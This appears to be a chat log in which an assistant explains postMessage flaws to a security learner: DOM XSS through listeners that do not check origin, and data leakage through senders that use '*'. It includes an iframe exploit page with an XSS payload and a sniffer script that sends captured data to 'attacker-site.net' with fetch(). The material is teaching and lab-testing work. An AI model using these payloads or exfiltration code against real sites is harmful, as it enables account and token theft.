
> [!Question]
> i want to understand postMessage for DOM based vuln. now as what i know this is used when there is popup window or iframe and the parent page wants to access other resources from other website, what i want to understand is, who have the listener and who have the postMessage the parent page or the target website

In the context of a DOM-based vulnerability, the **vulnerable party** is always the one with the **listener**, and the **attacker** is the one who sends the **`postMessage`**.

To understand this, think of `postMessage` as a "letter" and the listener as a "mailbox."

### The Roles: Who Does What?

|**Role**|**Entity**|**Action**|**Code Component**|
|---|---|---|---|
|**The Victim (Vulnerable Site)**|The Target Website|**Listens** for incoming messages.|`window.addEventListener('message', ...)`|
|**The Attacker**|The Exploit Page (Parent or Popup)|**Sends** the malicious payload.|`targetWindow.postMessage(payload, '*')`|

---
### How the Attack Flow Works

For a vulnerability to exist, the target website (the one you want to hack) must have a script that is waiting for data from other windows.

#### 1. The Victim's Setup (The Vulnerable Listener)

The target website has code that looks like this:
```js
// Located on https://vulnerable-website.com
window.addEventListener('message', function(event) {
    // VULNERABILITY: This code doesn't check WHERE the message came from!
    // It blindly takes data and sinks it into the DOM.
    var link = document.getElementById('output');
    link.innerHTML = event.data; 
});
```

Because the developer forgot to check `event.origin`, this "mailbox" will accept a "letter" from **any** website in the world.

#### 2. The Attacker's Setup (The Exploit)

As the attacker, you host a malicious page on your own Linux server. Your page will load the target site in an `iframe` and then "push" the payload into that listener.
```html
<iframe src="https://vulnerable-website.com" id="victim"></iframe>

<script>
    var iframe = document.getElementById('victim');
    
    // We wait for the iframe to load, then send the "letter"
    iframe.onload = function() {
        var payload = "<img src=x onerror=print()>";
        // We send the payload to the iframe's window
        iframe.contentWindow.postMessage(payload, '*'); 
    };
</script>
```

---
### Why this is a "DOM-based" Vulnerability

It is DOM-based because the entire attack happens in the browser.
1. **Source:** `event.data` (The content of the message you sent).    
2. **Sink:** `innerHTML` (Or `eval()`, `location.href`, etc.).

The server never sees this payload; it is purely a client-side execution caused by the target's script mismanaging the `message` event.

---
### Key Security Requirements (What developers usually miss)

To be secure, a listener **must** perform two checks that attackers look to bypass:

1. **Origin Validation:** `if (event.origin !== 'https://trusted.com') return;`
    - _Attack:_ If this is missing, any site can send data.
2. **Data Validation:** Even if the origin is correct, is the "shape" of the data safe?
    - _Attack:_ If the listener expects JSON but you send a string that gets concatenated into a sink, it’s game over.
---

### Practical Tip for your Lab/Testing

On your Linux machine, you can use the **Developer Tools (F12)** to find these listeners quickly:

1. Go to the **Global Listeners** or **Event Listeners** tab in the Inspector.
2. Look for `message`.
3. Click the link to the source code to see how it handles `event.data`.

If you see a `postMessage` listener that uses `innerHTML`, `document.write()`, or `$.html()` without an origin check, you have found a DOM XSS entry point.

**attacker uses a `window.open()` popup instead of an iframe to bypass certain headers**

---

> [!Question]
> what if there is program that has postmessage and sends sensitive data to *. then i can set a listener for this event to read data isn't?

Exactly. You have just described the **"Insecure Data Leakage"** side of `postMessage` vulnerabilities.

In your previous example, we discussed **XSS** (sending a malicious payload _to_ a listener). What you are describing now is **Sensitive Data Exposure** (stealing data _from_ a sender).

If a website uses `postMessage(sensitiveData, '*')`, it is broadcasting that data to the entire browser environment. Any window that can get a reference to that vulnerable window can set up a "receiver" and catch that data.

---

### How the Data Leakage Works

#### 1. The Vulnerable "Sender"

Imagine `https://bank.com` has a popup or an iframe that sends the user's API key or account balance back to the parent window, but the developer was lazy and used the wildcard `*`.
```js
// On https://bank.com
var secretData = { apiKey: "12345-ABCDE" };
window.parent.postMessage(secretData, '*'); // The '*' is the vulnerability
```

#### 2. The Attacker's "Sniffer"

As the attacker, you host a site (`https://malicious-site.net`). You just need to make sure the bank's page is loaded as a child of your page.
```html
<script>
    // 1. Set up the "Sniffer" listener first
    window.addEventListener('message', function(event) {
        // Since the bank sent to '*', our listener will catch it!
        console.log("Stolen Data: ", event.data);
        
        // Send the stolen data to your own Linux server
        fetch('https://attacker-site.net/log?data=' + JSON.stringify(event.data));
    });

    // 2. Load the vulnerable page as an iframe (or popup)
    const iframe = document.createElement('iframe');
    iframe.src = 'https://bank.com/vulnerable-page';
    document.body.appendChild(iframe);
</script>
```

---

### Why the `targetOrigin` (`*`) matters

The second argument in `postMessage(data, targetOrigin)` is a security feature.

- If the developer had written `postMessage(data, 'https://trusted-parent.com')`, the browser would check: _"Is the parent window actually `https://trusted-parent.com`?"_ If not, the browser **refuses to deliver the message**. 
- By using `*`, the developer tells the browser: _"I don't care who is listening; just give the data to whoever is the parent/opener."_

---

### Real-World Scenarios

This is commonly found in:
1. **OAuth Flows:** Passing access tokens from a popup back to the main app.
2. **SSO (Single Sign-On):** Passing user identity details between a login portal and the application.
3. **Payment Gateways:** Passing "transaction success" tokens from an iframe back to the store.

---

### How to test this on Linux
1. **Search for the keyword:** In Burp, search through all proxy history for the string `.postMessage(`. 
2. **Check the Origin:** Look at the second argument. If it's `'*'` or a variable that you can control, it's a lead.
3. **The Console Trick:** If you find a page that sends a `postMessage`, open your browser console on that page and run:
```js
// This 'redefines' how the window sends messages so you can see them
var oldPostMessage = window.postMessage;
window.postMessage = function(data, target) {
	console.trace("PostMessage Sent!", {data, target});
	oldPostMessage.apply(this, arguments);
};
```

---
### Summary of the two `postMessage` Flaws

|**Vulnerability Type**|**Direction**|**Sink/Source**|
|---|---|---|
|**DOM XSS**|Attacker $\rightarrow$ Victim|Victim has a weak **listener**.|
|**Data Leakage**|Victim $\rightarrow$ Attacker|Victim has a weak **sender** (`*`).|
